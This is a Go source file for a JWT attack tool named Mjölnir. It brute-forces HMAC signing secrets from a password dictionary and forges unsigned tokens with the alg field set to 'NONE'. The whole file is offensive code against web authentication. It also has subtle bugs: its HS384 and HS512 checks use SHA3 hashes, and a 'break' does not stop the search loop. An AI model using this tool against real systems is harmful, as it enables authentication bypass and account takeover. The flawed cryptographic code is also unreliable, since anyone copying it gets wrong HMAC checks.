package main

import (
	"bytes"
	"crypto"
	"crypto/hmac"
	"flag"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"time"

	"github.com/buger/jsonparser"
	"github.com/dgrijalva/jwt-go"
	"github.com/fatih/color"
)

var (
	version = "v1.1"
)

func main() {
	jwtFlag := flag.String("jwt", "", "The JWT token")
	dicFlag := flag.String("dict", "", "The password dictionary for brute force attack")
	excFlag := flag.Bool("exclude", false, "Signature exclusion attack")
	flag.Parse()

	yellow := color.New(color.FgYellow).SprintFunc()
	green := color.New(color.FgGreen).SprintFunc()
	blue := color.New(color.FgBlue).SprintFunc()
	red := color.New(color.FgRed).SprintFunc()

	log.SetOutput(os.Stdout)
	log.SetFlags(0)

	if *jwtFlag == "" {
		flag.Usage()
		return
	}

	log.Println("")
	log.Printf(green("[=]")+" Starting Mjölnir %s the JWT hammer.", version)

	jwtArr := strings.Split(*jwtFlag, ".")

	if len(jwtArr) != 3 {
		log.Fatal(red("[!]") + " Not a JWT token")
		return
	}

	header, _ := jwt.DecodeSegment(jwtArr[0])
	data, _ := jwt.DecodeSegment(jwtArr[1])
	signature, _ := jwt.DecodeSegment(jwtArr[2])

	log.Println(blue("[+]") + " JWT info:")
	log.Printf(blue("[+]")+" Header:    %s", header)
	log.Printf(blue("[+]")+" Data:      %s", data)
	log.Printf(blue("[+]")+" Signature: %x", signature)

	if *dicFlag != "" {
		// Set the payload
		payload := jwtArr[0] + "." + jwtArr[1]
		log.Printf(blue("[+]")+" Payload:  %s", payload)

		// Load password dictionary
		log.Println(yellow("[*]") + " Loading dictionary")
		file, err := ioutil.ReadFile(*dicFlag)
		if err != nil {
			log.Fatalf(red("[!]")+" %s", err.Error())
		}
		passwds := strings.Split(string(file), "\n")

		alg, err := getSignMode(header)
		if err != nil {
			log.Printf(red("[!]") + err.Error())
			return
		}

		// Bruteforce the password
		then := time.Now()

		var passOk string
		log.Println(yellow("[*]") + " Starting bruteforce, this can be slow, be patient")
		for _, pwd := range passwds {
			switch alg {
			case "hs256":
				if hs256Calculator([]byte(payload), signature, []byte(pwd)) {
					passOk = pwd
					break
				}
			case "hs384":
				if hs384Calculator([]byte(payload), signature, []byte(pwd)) {
					passOk = pwd
					break
				}
			case "hs512":
				if hs512Calculator([]byte(payload), signature, []byte(pwd)) {
					passOk = pwd
					break
				}
			}
		}

		now := time.Now().Sub(then).String()
		if passOk != "" {
			log.Printf(green("[=]")+" Key found in %s, the key is %s", now, passOk)
		} else {
			log.Printf(red("[!]")+" Password not found after running for %s :(", now)
		}

		return
	} else if *excFlag {
		header := jwt.EncodeSegment([]byte("{\"alg\":\"NONE\",\"typ\":\"JWT\"}"))
		token := header + "." + jwtArr[1] + "."
		log.Printf(green("[=]")+" New token w/o signature: %s", token)
		return
	}

	log.Println(red("[!]") + " No attack specified")
}

func getSignMode(header []byte) (string, error) {
	alg, err := jsonparser.GetString(header, "alg")
	return strings.ToLower(string(alg)), err
}

func hs256Calculator(payload, signature, password []byte) bool {
	mac := hmac.New(crypto.SHA256.New, password)
	mac.Write(payload)
	newhmac := mac.Sum(nil)

	return bytes.Compare(signature, newhmac) == 0
}

func hs384Calculator(payload, signature, password []byte) bool {
	mac := hmac.New(crypto.SHA3_384.New, password)
	mac.Write(payload)
	newhmac := mac.Sum(nil)

	return bytes.Compare(signature, newhmac) == 0
}

func hs512Calculator(payload, signature, password []byte) bool {
	mac := hmac.New(crypto.SHA3_512.New, password)
	mac.Write(payload)
	newhmac := mac.Sum(nil)

	return bytes.Compare(signature, newhmac) == 0
}
